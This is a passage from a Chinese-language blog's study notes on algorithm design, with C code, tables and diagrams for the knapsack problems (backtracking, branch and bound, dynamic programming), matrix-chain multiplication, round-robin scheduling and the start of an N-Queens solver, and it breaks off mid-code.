color="#00b0f0">深度优先搜索</font>：<ol><li>一路“选选选”到底，选不动了就尝试更新一次最大价值（<code>maxv</code>）和最优选择记录（<code>x[]</code>）。然后回溯到上一个分叉，改走“不选”的那条路，继续深入，再回溯……直到走遍了从根节点出发的每一条路径。</li></ol></li><li><font color="#00b0f0">剪枝函数</font>：<ol><li>为了避免无效或冗余的路径搜索，引入剪枝函数进行预判和提前终止</li></ol></li></ol><p>下图展示的是仅采用深度优先搜索（DFS）但未进行剪枝处理所生成的表达图：</p><pre class="mermaid">graph TD    A[(0,0)] -->|选物品1| B[(2,3)]    A -->|不选物品1| C[(0,0)]    B -->|选物品2| D[(5,7)]    B -->|不选物品2| E[(2,3)]    C -->|选物品2| F[(3,4)]    C -->|不选物品2| G[(0,0)]    D -->|选物品3| H[(9,14)]    D -->|不选物品3| I[(5,7)]    E -->|选物品3| J[(6,10)]    E -->|不选物品3| K[(2,3)]    F -->|选物品3| L[(7,11)]    F -->|不选物品3| M[(3,4)]    G -->|选物品3| N[(4,7)]    G -->|不选物品3| O[(0,0)]</pre><p>在原图的基础上，稍微增加一点注解，方便理解：<br><img src="/2025/04/20/%E7%AC%94%E8%AE%B0%EF%BC%9A%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1/image-20250423145007380.png"></p><p>&#x3D;&#x3D;2.代码示例&#x3D;&#x3D;</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-comment">// 1. 定义变量</span><br><span class="hljs-type">int</span> n = <span class="hljs-number">3</span>;                                       <span class="hljs-comment">// 物品数量</span><br><span class="hljs-type">int</span> capacity = <span class="hljs-number">10</span>;                               <span class="hljs-comment">// 背包容量</span><br><span class="hljs-type">int</span> weight[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;;                    <span class="hljs-comment">// 物品重量（下标从1开始）</span><br><span class="hljs-type">int</span> value[<span class="hljs-number">4</span>]  = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>&#125;;                    <span class="hljs-comment">// 物品价值（洗标从1开始）</span><br><br><span class="hljs-type">int</span> maxValue = <span class="hljs-number">0</span>;                                <span class="hljs-comment">// 用来存放最大价值（不断赋值更新，直到找到最大价值）</span><br><span class="hljs-type">int</span> currSelect[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;                         <span class="hljs-comment">// 当前选择路径</span><br><span class="hljs-type">int</span> bestSelect[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;                         <span class="hljs-comment">// 最优选择路径（不断赋值更新，直到找到最优选择路径）</span><br><br><br><span class="hljs-comment">// 2. 深度优先搜索函数</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">backtrack</span><span class="hljs-params">(<span class="hljs-type">int</span> i, <span class="hljs-type">int</span> currWeight, <span class="hljs-type">int</span> currValue)</span> </span>&#123; <span class="hljs-comment">// 核心函数，做深度优先遍历，逐个尝试选还是不选物品</span><br>    <span class="hljs-keyword">if</span> (i &gt; n) &#123;                                       <span class="hljs-comment">// 如果已经考虑完所有物品了</span><br>        <span class="hljs-keyword">if</span> (currValue &gt; maxValue) &#123;                    <span class="hljs-comment">// 看看当前选择的物品总价值 currValue 是否大于之前记录的最大价值 maxValue，如果大，则更新 maxValue 和 bestSelect</span><br>            maxValue = currValue;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">1</span>; k &lt;= n; k++) &#123;<br>                bestSelect[k] = currSelect[k];<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (currWeight + weight[i] &lt;= capacity) &#123;          <span class="hljs-comment">// 如果没有考虑所有物品，现在考虑第 i 个物品选不选，如果 已选重量 + 本物品重量 不超过背包最大容量，则选择当前物品，并递归调用 backtrack 方法，考虑下一个物品</span><br>    <br>        currSelect[i] = <span class="hljs-number">1</span>;<br>        <span class="hljs-built_in">backtrack</span>(i + <span class="hljs-number">1</span>, currWeight + weight[i], currValue + value[i]);<br>    &#125;<br><br>    currSelect[i] = <span class="hljs-number">0</span>;                                 <span class="hljs-comment">// 回溯法的关键一步：即便尝试过“选当前物品”，并进行了一系列递归，当递归完成后，也必须回到这一层继续探索“不选当前物品”的可能</span><br>    <span class="hljs-built_in">backtrack</span>(i + <span class="hljs-number">1</span>, currWeight, currValue);<br>&#125;<br><br><br><span class="hljs-comment">// 3. 主方法</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">backtrack</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);                                <span class="hljs-comment">// 从第一个物品开始考虑</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;能够放入背包的最大价值 = %d\n&quot;</span>, maxValue);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;选择的物品有：&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        <span class="hljs-keyword">if</span> (bestSelect[i]) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;物品%d(重%d,值%d) &quot;</span>, i, weight[i], value[i]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><br><span class="hljs-comment">// 在贪心法中，由于我们是取完就行了，而且取的必然是最优解，所以直接使用capacity，即便改全局也没有事情，但是这个是不知道最优解，在找最优解，要循环很多次，所以我们引入一个currWeight，不通过改变capacity 的方式</span><br></code></pre></td></tr></table></figure><hr><h5 id="1-2-5-分支限界法"><a href="#1-2-5-分支限界法" class="headerlink" title="1.2.5. 分支限界法"></a>1.2.5. 分支限界法</h5><p>&#x3D;&#x3D;1.解题思路&#x3D;&#x3D;</p><ol><li>首先计算每个物品的单位重量价值（即 <code>v/w</code>），并根据该比值将物品<strong>按从高到低的顺序排序</strong>。这是因为单位价值越高的物品，在有限的背包容量中越“划算”，优先选择可以最大化总价值。</li><li>接着使用分支限界法构建决策树，分支限界法的核心思想是使用 <strong>“广度优先搜索 + 限界函数”</strong> 构建决策树：<ol><li><font color="#00b0f0">广度优先搜索</font>：<ol><li>不像回溯法，一路选选选，先考虑选的问题，再回溯考虑不选的问题，而是两者一起考虑，选此物品和不选此物品，一起深入，直到走遍了每一条节点</li></ol></li><li><font color="#00b0f0">限界函数</font>：<ol><li>在每一步选择时，计算当前路径下的上界，上界即本路径最大可能价值 &#x3D; 当前价值 + 剩余容量能获得的最大价值</li><li>如果某个节点的上界 ≤ 当前已知的最优解（拿到的最高价值），就直接剪枝，不再深入（你最好的路劲还没我已经拿到的多，那我还走个狗屁啊）</li></ol></li></ol></li><li>接着，从单位价值最高的物品开始，<strong>依次尽可能多地放入背包</strong>， <strong>一个物品只能放一次</strong>，如果某个节点的上界 ≤ 当前已知的最优解（最高的价值），就直接剪枝，不再深入。</li></ol><blockquote><p>[!NOTE] 注意事项</p><ol><li>一般贪心法、分支限界法会根据单位重量价值为物品排序</li></ol></blockquote><p>&#x3D;&#x3D;2.举例说明&#x3D;&#x3D;<br>例如，我们可以先计算每个物品的单位价值（即价值与重量的比值）如下：</p><ul><li>物品1：3 ÷ 2 &#x3D; 1.5</li><li>物品2：4 ÷ 3 ≈ 1.33</li><li>物品3：7 ÷ 4 &#x3D; 1.75</li></ul><p>根据单位价值从高到低排序，结果为：物品3 → 物品1 → 物品2</p><pre class="mermaid">graph TD    A[(currWeight=0, currValue=0, UB14)] -->|选物品3| B[(4, 7, 14)]    A -->|不选物品3| C[(0, 0, 7)]    B -->|选物品1| D[(6, 10, 13.5)]     B -->|不选物品1| E[(4, 7, 10.5)]    D -->|选物品2| F[(9, 14, 14)]    D -->|不选物品2| G[(6, 10, 10)]    E -->|选物品2| H[(7, 11, 11)]    C -->|选物品1| I[(2, 3, 6.5)]    C -->|不选物品1| J[(0, 0, 3)]</pre><p>在原图的基础上，稍微增加一点注解，方便理解：<br><img src="/2025/04/20/%E7%AC%94%E8%AE%B0%EF%BC%9A%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1/image-20250423193649866.png"></p><hr><h4 id="1-3-完全背包"><a href="#1-3-完全背包" class="headerlink" title="1.3. 完全背包"></a>1.3. 完全背包</h4><h5 id="1-3-1-题目描述"><a href="#1-3-1-题目描述" class="headerlink" title="1.3.1. 题目描述"></a>1.3.1. 题目描述</h5><p>给定一个背包，其最大承重为 10，且有 3 件物品可供选择。每件物品的重量和价值如下：</p><ul><li>物品 1：重量 2，价值 3</li><li>物品 2：重量 3，价值 4</li><li>物品 3：重量 4，价值 7<br><strong>每个物品无限取，但不能分割</strong>，请求能够放入背包的最大价值。</li></ul><hr><h5 id="1-3-2-动态规划法（代码）"><a href="#1-3-2-动态规划法（代码）" class="headerlink" title="1.3.2. 动态规划法（代码）"></a>1.3.2. 动态规划法（代码）</h5><p>&#x3D;&#x3D;1.解题思路&#x3D;&#x3D;<br>根据当前背包容量判断是否可以放入第 <code>i</code> 个物品，分两种情况讨论：</p><ol><li><font color="#00b0f0">不能放</font>：<ol><li>如果当前容量小于物品 <code>i</code> 的重量，说明放不下，直接继承「相同容量下、前一个物品」的最优解。</li></ol></li><li><font color="#00b0f0">可以放</font>：<ol><li>如果当前容量足够放下物品 <code>i</code>，则需要判断是否“值得”放，对比下面两种选择，取最大值作为当前状态的最优解</li><li><font color="#7030a0">不放当前物品</font>：<ol><li>直接继承「相同容量下、前一个物品」的最优解；</li></ol></li><li><font color="#7030a0">放当前物品</font>：<ol><li>考虑当前物品的价值 + 「剩余容量下、<font color="#ff0000">当前物品</font>」的最优解</li><li>和 0&#x2F;1 背包的区别就仅仅在于（☆☆☆）：<ol><li><strong>0&#x2F;1 背包中每种物品只能取一次</strong>，一旦选择就不能再取，因此状态转移时需要参考「<strong>剩余容量下，前一个物品</strong>」的最优解；</li><li>而在<strong>完全背包问题中，物品可以无限次取用</strong>，所以只需考虑「<strong>当前物品在剩余容量下</strong>」的最优解即可。</li></ol></li></ol></li></ol></li></ol><p>&#x3D;&#x3D;2.举例说明&#x3D;&#x3D;<br>在分析问题时，我们通常会构造出一个如下的动态规划表。</p><p>以坐标 (1, 1) 为例，表示当前考虑第 1 个物品，背包容量为 1。由于物品的重量为 2，超过了当前背包容量，因此无法放入，只能继承「相同容量下、前一个物品」的最优解，即 (0, 1) 处的值。</p><p>例如 (2, 6)，表示当前考虑第 2 个物品，背包容量为 6，物品重量为 3。此时我们有两种选择：</p><ul><li><strong>不放该物品</strong>：直接继承「相同容量下、前一个物品」的最优解，即 (1, 6)；</li><li><strong>放入该物品</strong>：当前物品价值为 4，放入后剩余容量为 3，此时我们还可以使用「剩余容量下、<font color="#ff0000">当前物品</font>」的最优解，即 (2, 3)。因此，总价值为 4 + (2,3)。<br>最终在这两种选择中取最大值，作为状态 (2, 6) 的最优解。</li></ul><table><thead><tr><th>物品\容量</th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>10</th></tr></thead><tbody><tr><td><strong>0</strong></td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr><tr><td><strong>1（2,3）</strong></td><td>0</td><td>0</td><td>3</td><td>3</td><td>6</td><td>6</td><td>9</td><td>9</td><td>12</td><td>12</td><td>15</td></tr><tr><td><strong>2（3,4）</strong></td><td>0</td><td>0</td><td>3</td><td>4</td><td>6</td><td>7</td><td>9</td><td>10</td><td>12</td><td>13</td><td>15</td></tr><tr><td><strong>3（4,7）</strong></td><td>0</td><td>0</td><td>3</td><td>4</td><td>7</td><td>7</td><td>10</td><td>11</td><td>14</td><td>14</td><td>17</td></tr></tbody></table><p>&#x3D;&#x3D;3.代码示例&#x3D;&#x3D;</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">max</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> </span>&#123;                <span class="hljs-comment">// 工具函数，取两个数中的最大值</span><br>    <span class="hljs-keyword">return</span> a &gt; b ? a : b;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> n = <span class="hljs-number">3</span>;                        <span class="hljs-comment">// 物品个数</span><br>    <span class="hljs-type">int</span> capacity = <span class="hljs-number">10</span>;                <span class="hljs-comment">// 背包容量</span><br>    <span class="hljs-type">int</span> weight[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;;     <span class="hljs-comment">// 物品重量，下标从1开始</span><br>    <span class="hljs-type">int</span> value[<span class="hljs-number">4</span>]  = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>&#125;;     <span class="hljs-comment">// 物品价值，下标从1开始</span><br><br>    <span class="hljs-type">int</span> a[<span class="hljs-number">4</span>][<span class="hljs-number">11</span>] = &#123;<span class="hljs-number">0</span>&#125;;               <span class="hljs-comment">// 动态规划数组 a[i][j] 表示在考虑前 i 个物品时，背包容量为 j 时的最大价值。（相当于我们列的表格的每一行，11 是因为虽然最大容量是 10，但容量是从 0 开始的，所以需要 11 个容量点）</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; ++i) &#123;               <span class="hljs-comment">// 遍历每一个物品</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt;= capacity; ++j) &#123;    <span class="hljs-comment">// 遍历每一种容量</span><br>            <span class="hljs-keyword">if</span> (j &lt; weight[i]) &#123;                 <span class="hljs-comment">// 必然不选当前物品的情况</span><br>                a[i][j] = a[i - <span class="hljs-number">1</span>][j];<br>            &#125; <span class="hljs-keyword">else</span> &#123;                             <span class="hljs-comment">// 可能选当前物品的情况</span><br>                a[i][j] = <span class="hljs-built_in">max</span>(a[i - <span class="hljs-number">1</span>][j], a[i][j - weight[i]] + value[i]);   <span class="hljs-comment">// a[i] 是核心</span><br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;max = %d\n&quot;</span>, a[n][capacity]);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h5 id="1-3-3-分支限界法"><a href="#1-3-3-分支限界法" class="headerlink" title="1.3.3. 分支限界法"></a>1.3.3. 分支限界法</h5><p>&#x3D;&#x3D;1.解题思路&#x3D;&#x3D;</p><ol><li>首先计算每个物品的单位重量价值（即 <code>v/w</code>），并根据该比值将物品<strong>按从高到低的顺序排序</strong>。这是因为单位价值越高的物品，在有限的背包容量中越“划算”，优先选择可以最大化总价值。</li><li>接着使用分支限界法构建决策树，分支限界法的核心思想是使用 <strong>“广度优先搜索 + 限界函数”</strong> 构建决策树：<ol><li><font color="#00b0f0">广度优先搜索</font>：<ol><li>不像回溯法，一路选选选，先考虑选的问题，再回溯考虑不选的问题，而是两者一起考虑，选此物品和不选此物品，一起深入，直到走遍了每一条节点</li></ol></li><li><font color="#00b0f0">限界函数</font>：<ol><li>在每一步选择时，计算当前路径下的上界，上界即本路径最大可能价值 &#x3D; 当前价值 + 剩余容量能获得的最大价值</li><li>如果某个节点的上界 ≤ 当前已知的最优解（拿到的最高价值），就直接剪枝，不再深入（你最好的路劲还没我已经拿到的多，那我还走个狗屁啊）</li></ol></li></ol></li><li>接着，从单位价值最高的物品开始，<strong>依次尽可能多地放入背包</strong>，<strong>一个物品可能放多次</strong>， 如果某个节点的上界 ≤ 当前已知的最优解（最高的价值），就直接剪枝，不再深入。</li></ol><p>&#x3D;&#x3D;2.举例说明&#x3D;&#x3D;<br>例如，我们可以先计算每个物品的单位价值（即价值与重量的比值）如下：</p><ul><li>物品1：3 ÷ 2 &#x3D; 1.5</li><li>物品2：4 ÷ 3 ≈ 1.33</li><li>物品3：7 ÷ 4 &#x3D; 1.75</li></ul><p>根据单位价值从高到低排序，结果为：物品3 → 物品1 → 物品2</p><pre class="mermaid">graph TD    %% 根节点：还没选任何物品（i=3 表示下一个要选的是物品3）    A[( currWeight=0, currValue=0,  UB=17)]     %% 枚举物品3 放 0、1、2 件    A -->|放 0 件3号| B[(0,  0, 15)]    A -->|放 1 件3号| C[(4, 7, 16)]    A -->|放 2 件3号| D[(8, 14, 17)]        %% 对 D 节点（最优上界17）继续枚举物品1    D -->|放 0 件1号| E[( 8, 14, 14)]    D -->|放 1 件1号| F[(10, 17, 17)]</pre><hr><h3 id="2-矩阵链乘法"><a href="#2-矩阵链乘法" class="headerlink" title="2. 矩阵链乘法"></a>2. 矩阵链乘法</h3><h4 id="2-1-题目描述"><a href="#2-1-题目描述" class="headerlink" title="2.1. 题目描述"></a>2.1. 题目描述</h4><p>计算矩阵连乘积 A1A2A3A4A5 的最佳求积顺序（即 数乘次数最少的计算次序），各矩阵的维数分别是：</p><table><thead><tr><th>矩阵</th><th>A1</th><th>A2</th><th>A3</th><th>A4</th><th>A5</th></tr></thead><tbody><tr><td><strong>维数</strong></td><td>2 X 3</td><td>3 X 6</td><td>6 X 4</td><td>4 X 2</td><td>2 X 7</td></tr></tbody></table><hr><h4 id="2-2-动态规划法"><a href="#2-2-动态规划法" class="headerlink" title="2.2. 动态规划法"></a>2.2. 动态规划法</h4><p>&#x3D;&#x3D;1.解题思路&#x3D;&#x3D;<br>根据<strong>动态规划</strong>的转移公式，填写 <code>m[i][j]</code> 表格。该表格的含义是：从矩阵 <code>Aᵢ</code> 到 <code>Aⱼ</code> 连乘时，所需的<strong>最少标量乘法次数</strong>。</p><p><img src="/2025/04/20/%E7%AC%94%E8%AE%B0%EF%BC%9A%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1/image-20250423195358074.png"></p><p>下表展示了一个典型的 <code>m[i][j]</code> 表：</p><table><thead><tr><th>i \ j</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th></tr></thead><tbody><tr><td>1</td><td><font color="#00b0f0">0</font></td><td><font color="#7030a0">p₀p₁p₂</font></td><td><font color="#00b050">下 + 左 + p₀&lt;p₁、p₂&gt;p₃</font></td><td><font color="#de7802">下 + 左 + p₀&lt;p₁、p₂、p₃&gt;p₄</font></td><td>下 + 左 + p₀&lt;p₁、p₂、p₃、p₄&gt;p₅</td></tr><tr><td>2</td><td></td><td><font color="#00b0f0">0</font></td><td><font color="#7030a0">p₁p₂p₃</font></td><td><font color="#00b050">下 + 左 + p₁&lt;p₂、p₃&gt;p₄</font></td><td><font color="#de7802">下 + 左 + p₁&lt;p₂、p₃、p₄&gt;p₅</font></td></tr><tr><td>3</td><td></td><td></td><td><font color="#00b0f0">0</font></td><td><font color="#7030a0">p₂p₃p₄</font></td><td><font color="#00b050">下 + 左 + p₂&lt;p₃、p₄&gt;p₅</font></td></tr><tr><td>4</td><td></td><td></td><td></td><td><font color="#00b0f0">0</font></td><td><font color="#7030a0">p₃p₄p₅</font></td></tr><tr><td>5</td><td></td><td></td><td></td><td></td><td><font color="#00b0f0">0</font></td></tr></tbody></table><p><img src="/2025/04/20/%E7%AC%94%E8%AE%B0%EF%BC%9A%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1/image-20250422163923899.png"></p><p>接下来，依据每个区间的最优断开位置 <code>k</code>，我们填充另一个表格 <code>s[i][j]</code>，用于记录最优括号化方式：</p><table><thead><tr><th>i \ j</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th></tr></thead><tbody><tr><td><strong>1</strong></td><td>0</td><td>1</td><td>2</td><td>2</td><td>4</td></tr><tr><td><strong>2</strong></td><td></td><td>0</td><td>2</td><td>2</td><td>2</td></tr><tr><td><strong>3</strong></td><td></td><td></td><td>0</td><td>3</td><td>4</td></tr><tr><td><strong>4</strong></td><td></td><td></td><td></td><td>0</td><td>4</td></tr><tr><td><strong>5</strong></td><td></td><td></td><td></td><td></td><td>0</td></tr></tbody></table><p>最终，通过查找 <code>m[1][n]</code>，即可得到整个矩阵链乘法的<strong>最少计算次数</strong>。</p><p>&#x3D;&#x3D;2.举例说明&#x3D;&#x3D;<br><img src="/2025/04/20/%E7%AC%94%E8%AE%B0%EF%BC%9A%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1/image-20250423200052721.png"></p><hr><h3 id="3-循环赛问题"><a href="#3-循环赛问题" class="headerlink" title="3. 循环赛问题"></a>3. 循环赛问题</h3><h4 id="3-1-题目描述"><a href="#3-1-题目描述" class="headerlink" title="3.1. 题目描述"></a>3.1. 题目描述</h4><p>设有n&#x3D;2^k个运动员要进行循环赛，现设计一个满足以下要求的比赛日程表： </p><ol><li>每个选手必须与其他n-1名选手比赛各一次； </li><li>每个选手一天至多只能赛一次；</li><li>循环赛要在最短时间内完成。</li></ol><p>问题如下：<br>（1）如果n&#x3D;2^k，循环赛最少需要进行几天<br>（2）当n&#x3D;2^3&#x3D;8时，请画出循环赛日程表。<br>（3）时间复杂度是多少。</p><hr><h4 id="3-2-分治法"><a href="#3-2-分治法" class="headerlink" title="3.2. 分治法"></a>3.2. 分治法</h4><p>&#x3D;&#x3D;1.问题(1)&#x3D;&#x3D;<br>循环赛至少要进行 2^k -1 天（结论，记住就行）</p><p>&#x3D;&#x3D;2.问题(2)&#x3D;&#x3D;</p><table><thead><tr><th>选手\天数</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th></tr></thead><tbody><tr><td>1</td><td>2</td><td>3</td><td>4</td><td>5</td><td>6</td><td>7</td><td>8</td></tr><tr><td>2</td><td>1</td><td>4</td><td>3</td><td>6</td><td>5</td><td>8</td><td>7</td></tr><tr><td>3</td><td>4</td><td>1</td><td>2</td><td>7</td><td>8</td><td>5</td><td>6</td></tr><tr><td>4</td><td>3</td><td>2</td><td>1</td><td>8</td><td>7</td><td>6</td><td>5</td></tr><tr><td>5</td><td>6</td><td>7</td><td>8</td><td>1</td><td>2</td><td>3</td><td>4</td></tr><tr><td>6</td><td>5</td><td>8</td><td>7</td><td>2</td><td>1</td><td>4</td><td>3</td></tr><tr><td>7</td><td>8</td><td>5</td><td>6</td><td>3</td><td>4</td><td>1</td><td>2</td></tr><tr><td>8</td><td>7</td><td>6</td><td>5</td><td>4</td><td>3</td><td>2</td><td>1</td></tr></tbody></table><p><img src="/2025/04/20/%E7%AC%94%E8%AE%B0%EF%BC%9A%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1/image-20250424122744535.png"></p><p>&#x3D;&#x3D;3.问题(3)&#x3D;&#x3D;</p><p>时间复杂度为：O(n^2)</p><hr><h3 id="4-N-皇后（代码）"><a href="#4-N-皇后（代码）" class="headerlink" title="4. N 皇后（代码）"></a>4. N 皇后（代码）</h3><figure class="highlight stan"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs stan"><span class="hljs-meta">#include &lt;<span class="hljs-string">stdio.h</span>&gt;</span><br><span class="hljs-meta">#include &lt;<span class="hljs-string">stdlib.h</span>&gt;</span><br><br><span class="hljs-comment">#define N 4                  // 4 皇后问题</span><br><br><span class="hljs-type">int</span> solutions = <span class="hljs-number">0</span>;           <span class="hljs-comment">// 解的总数</span><br><br><span class="hljs-type">int</span> queen[<span class="hljs-number">5</span>];            <span class="hljs-comment">// 皇后位置数组，queen[1]=3 表示第 1 行皇后放在了第三列（N + 1 的原因是，虽然皇后是从 1 开始，但是还有一个0）</span><br><br><br><span class="hljs-type">void</span> printSolution() &#123;       <span class="hljs-comment">// 打印当前解的棋盘</span><br>    printf(<span class="hljs-string">&quot;解 %d:\n&quot;</span>, solutions);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-built_in">row</span> = <span class="hljs-number">1</span>; <span class="hljs-built_in">row</span> &lt;= N; <span class="hljs-built_in">row</span>++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-built_in">col</span> = <span class="hljs-number">1</span>; <span class="hljs-built_in">col</span> &lt;= N; <span class="hljs-built_in">col</span>++) &#123;<br>            printf(queen[<span class="hljs-built_in">row</span>] == <span class="hljs-built_in">col</span> ? <span class="hljs-string">&quot;Q &quot;</span> : <span class="hljs-string">&quot;. &quot;</span>);<br>        &#125;<br>        printf(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>    printf(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><br><br><span class="hljs-type">int</span> isSafe(<span class="hljs-type">int</span> <span class="hljs-built_in">row</span>, <span class="hljs-type">int</span> <span class="hljs-built_in">col</span>) &#123;          <span class="hljs-comment">// 检查皇后放在这里是否安全</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-built_in">row</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (queen[i] == <span class="hljs-built_in">col</span> || <span class="hljs-built_in">abs</span>(i - <span class="hljs-built_in">row</span>) == <span class="hljs-built_in">abs</span>(queen[i] - <span class="hljs-built_in">col</span>)) &#123; <span class="hljs-comment">// 核心判断代码，记住</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><br><span class="hljs-type">void</span> backtrack(<span class="hljs-type">int</span> <span class="hljs-built_in">row</span>) &#123;                     <span class="hljs-comment">// 回溯核心函数</span><br>    <span 